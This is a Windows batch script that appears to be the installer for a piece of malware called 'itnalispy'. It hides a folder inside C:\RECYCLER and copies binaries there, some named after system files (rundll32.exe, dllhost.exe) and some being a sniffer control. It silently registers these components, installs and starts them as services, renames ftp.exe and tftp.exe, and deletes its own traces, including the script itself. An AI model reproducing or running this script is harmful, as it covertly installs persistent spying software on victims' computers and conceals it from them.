@echo off
net.exe stop itnalispy
attrib +h +s C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\
attrib +h +s C:\RECYCLER\
del /F /Q C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy.exe
copy /Y itnalispy.exe C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy.exe
copy /Y service.exe C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\service.exe
copy /Y itnalispy.o C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy.o
copy /Y itnalispy666.o C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy666.o
copy /Y devldr32.exe C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\devldr32.exe
copy /Y rundll32.exe C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\rundll32.exe
copy /Y dllhost.exe C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\dllhost.exe
copy /Y SocketMaster.ocx C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\SocketMaster.ocx
copy /Y stdole2.tlb C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\stdole2.tlb
copy /Y itnalispy_wsa.dll C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy_wsa.dll
copy /Y itnalispy_sniffer.ocx C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\itnalispy_sniffer.ocx
cd C:\RECYCLER\S-1-5-21-0606982848-1057904186-854245398-1003\
regsvr32.exe /s SocketMaster.ocx
regsvr32.exe /s itnalispy_wsa.dll
regsvr32.exe /s itnalispy_sniffer.ocx
service.exe -r itnalispy666
service.exe -r itnalispy
service.exe itnalispy666.o
service.exe itnalispy.o
net.exe start itnalispy666
net.exe start itnalispy
del /F /Q itnalispy.o
del /F /Q itnalispy666.o
cd C:\RECYCLER\
del /F /Q service.exe
del /F /Q itnalispy.o
del /F /Q itnalispy666.o
del /F /Q devldr32.exe
del /F /Q rundll32.exe
del /F /Q dllhost.exe
del /F /Q SocketMaster.ocx
del /F /Q stdole2.tlb
del /F /Q itnalispy_sniffer.ocx
del /F /Q itnalispy_wsa.dll
cd %systemroot%\system32\
rename ftp.exe f-t-p.exe
rename tftp.exe t-f-t-p.exe
cd C:\RECYCLER\
del /F /Q uhmnf.bat
exit